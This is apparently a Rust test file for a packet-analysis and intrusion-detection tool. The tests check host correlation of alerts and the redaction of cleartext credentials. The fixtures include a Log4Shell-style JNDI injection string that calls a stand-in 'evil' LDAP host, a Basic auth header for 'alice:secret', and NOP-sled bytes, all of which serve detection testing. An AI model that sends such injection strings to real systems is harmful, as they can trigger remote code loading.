#[path = "support/packets.rs"]
mod packets;

use packrat_tui::{
    engine::AnalysisCore,
    model::graph_types::{GraphNodeData, GraphNodeKind},
    net::parser::parse_ethernet,
};

#[test]
fn alerts_correlate_to_actual_hosts_before_any_ui_tick() {
    let mut core = AnalysisCore::default();
    let packet = packets::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}");
    core.analyze(&packet);
    let graph = &core.operator_graph;
    let alert = graph
        .all_nodes()
        .find(|node| matches!(&node.data, GraphNodeData::Alert(_)))
        .unwrap();
    assert_eq!(graph.in_edges(alert.id).len(), 2);
    assert_eq!(alert.first_seen, 1.0);
    if let GraphNodeData::Alert(data) = &alert.data {
        assert!(data.detail.contains("10.0.0.1"));
        assert!(data.detail.contains("10.0.0.2"));
    }
    let counts = (graph.node_count(), graph.edge_count());
    core.rebuild_retained_graph([&packet]);
    assert_eq!(
        (
            core.operator_graph.node_count(),
            core.operator_graph.edge_count()
        ),
        counts
    );
    for _ in 0..60 {
        core.maintenance();
    }
    assert_eq!(
        (
            core.operator_graph.node_count(),
            core.operator_graph.edge_count()
        ),
        counts
    );
}

#[test]
fn cleartext_credentials_have_host_links_and_packet_evidence() {
    let packet = packets::tcp(
        1,
        100,
        0x18,
        b"GET / HTTP/1.1\r\nAuthorization: Basic YWxpY2U6c2VjcmV0\r\n\r\n",
    );
    let mut raw = packet.bytes.to_vec();
    raw[34..36].copy_from_slice(&20480u16.to_be_bytes());
    let packet = parse_ethernet(&raw, 1, 1.0);
    let mut core = AnalysisCore::default();
    core.analyze(&packet);
    assert_eq!(core.credentials.len(), 1);
    let alerts = core.alert_center.drain_pending_exports();
    let finding = alerts.iter().find(|alert| alert.source == "CREDENTIAL").unwrap();
    assert_eq!(finding.packet_refs, [1]);
    assert!(finding.detail.contains("value omitted"));
    assert!(!serde_json::to_string(&alerts).unwrap().contains("alice:secret"));
    let graph = &core.operator_graph;
    let nodes = graph.nodes_by_kind(&GraphNodeKind::Credential);
    assert_eq!(nodes.len(), 1);
    assert!(!graph.get_node(nodes[0]).unwrap().evidence.is_empty());
    assert_eq!(graph.in_edges(nodes[0]).len(), 1);
    assert_eq!(graph.out_edges(nodes[0]).len(), 1);
}

#[test]
fn credential_alert_reviews_are_scoped_without_exposing_values() {
    use packrat_tui::net::packet::{CaptureMetadata, CaptureTimestamp, TimestampResolution};

    let mut core = AnalysisCore::default();
    for (no, interface_id, port) in [(1, 0, 80_u16), (2, 0, 80), (3, 1, 80), (4, 0, 81)] {
        let mut raw = packets::tcp(
            no, 100, 0x18,
            b"GET / HTTP/1.1\r\nAuthorization: Basic YWxpY2U6c2VjcmV0\r\n\r\n",
        ).bytes;
        raw[34..36].copy_from_slice(&20_480_u16.to_be_bytes());
        raw[36..38].copy_from_slice(&port.to_be_bytes());
        let mut packet = parse_ethernet(&raw, no, no as f64);
        packet.capture = Some(CaptureMetadata {
            captured_length: raw.len() as u32, wire_length: raw.len() as u32,
            section_id: 0, interface_id, link_type: 1, interface_name: None, comments: Vec::new(),
            timestamp: Some(CaptureTimestamp { ticks: no, resolution: TimestampResolution::Decimal(0), offset_seconds: 0 }),
        });
        core.analyze(&packet);
    }
    let alerts: Vec<_> = core.alert_center.items.iter().filter(|alert| alert.source == "CREDENTIAL").collect();
    assert_eq!(alerts.len(), 3);
    for (index, frames) in [&[1, 2][..], &[3][..], &[4][..]].into_iter().enumerate() {
        let alert = alerts[index];
        assert_eq!(alert.packet_refs, frames);
        assert_eq!(alert.flow.unwrap().destination.port(), if index == 2 { 81 } else { 80 });
        assert!(alert.detail.contains("value omitted"));
        assert!(!serde_json::to_string(alert).unwrap().contains("alice:secret"));
        assert!(!alert.correlation_key.contains("YWxpY2U6c2VjcmV0"));
    }
}

#[test]
fn detection_correlation_continues_after_alert_retention_rollover() {
    let mut core = AnalysisCore::default();
    for no in 1..=1002 {
        core.analyze(&packets::tcp(no, 100, 0x18, &[0x90; 16]));
    }
    assert_eq!(core.security.ids_alerts.len(), 1000);
    let pattern_alerts = core.operator_graph.all_nodes().filter(|node| {
        matches!(&node.data, GraphNodeData::Alert(alert) if alert.signature == "Repeated NOP-like byte pattern")
    }).count();
    assert_eq!(pattern_alerts, 1002);
    assert!(
        core.operator_graph
            .all_nodes()
            .any(|node| matches!(&node.data, GraphNodeData::Alert(alert) if alert.pkt_no == 1002))
    );
}
